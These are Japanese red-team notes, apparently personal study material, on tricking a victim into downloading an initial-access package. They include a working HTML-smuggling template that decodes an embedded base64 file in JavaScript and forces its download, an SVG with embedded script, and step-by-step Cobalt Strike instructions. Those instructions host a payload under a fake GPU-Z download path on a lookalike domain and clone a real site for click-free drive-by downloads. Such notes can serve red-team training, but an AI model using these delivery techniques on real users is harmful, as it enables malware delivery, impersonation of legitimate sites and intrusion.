被害者に最初のアクセスパッケージをダウンロードさせる方法

## HTLM Smuggling
HTMLスマグリングとは、最新のHTML5やJavaScriptの機能を利用して、従来のコンテンツフィルターをすり抜けてファイルを密かに送り込む手法

HTMLスマグリングは、ファイルをHTMLコンテンツ自体にエンコードし、JavaScriptを使用してデコードして被害者のマシンにダウンロードすることで機能する

シンプルなテンプレート
```html
<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
                const fileName = 'test.txt';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>
```

## SVG Smuggling
代わりにSVG形式を利用
javascriptを埋め込む例
```xml
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
<script>
    alert('Hello World');
</script>
Sorry, your browser does not support inline SVG.
</svg> 
```

## Cobalt Strike Site Clone
Cobalt Strikeのドライブバイ攻撃機能
正規ウェブサイトを複製して、ターゲットのブラウザがページ上の何もクリックしなくても自動的にダウンロードするURLを埋め込み可能

[https://www.bleepingcomputer.com/download/gpu-z/](https://www.bleepingcomputer.com/download/gpu-z/)をクローンしてホストする例

### Host File
Site Management > Host File.
![](images/Pasted%20image%2020260526184158.png)

- **File**：アップロードする元のファイルです。これは初期アクセス用のパッケージになりま
- **Local URI**：Cobalt Strike の Web サーバーがこのファイルを公開する際の URI。
  この例では `/dl/windows/utilities/system-information/gpu-z/GPU-Z.2.22.0.exe` を使用
- **Local Host**：ホストされるファイルの URL を設定します。デフォルトではチームサーバーの公開IPアドレスになりますが、ここでは見せかけのドメインを使用しています。このドメインは、チームサーバーの公開IP（または HTTP リクエストをチームサーバーにリダイレクトできるリダイレクタ）を指す必要があります。
- **Local Port**：ファイルをホストするポート番号
- **Mime Type**：Cobalt Strike の内蔵 Web サーバーがファイルを配信する際の Content-Type

**Copy URL** ボタンをクリックすると、URL がクリップボードにコピーされる
Site Management > Manageで確認可能
### Clone site
Management > Clone Siteでクローン可能
![](images/Pasted%20image%2020260526184539.png)
- Clone URL：クローンしたいページのURL
- Local URI：チームサーバがホストするURI
- Local Host：ホストされるファイルの URL
- Local Port：同様
- Attack：クローンページに埋め込みたいリソースを指定

クローンが完了すると、ローカルホスト、ローカルポート、ローカル URI を連結した URL が生成される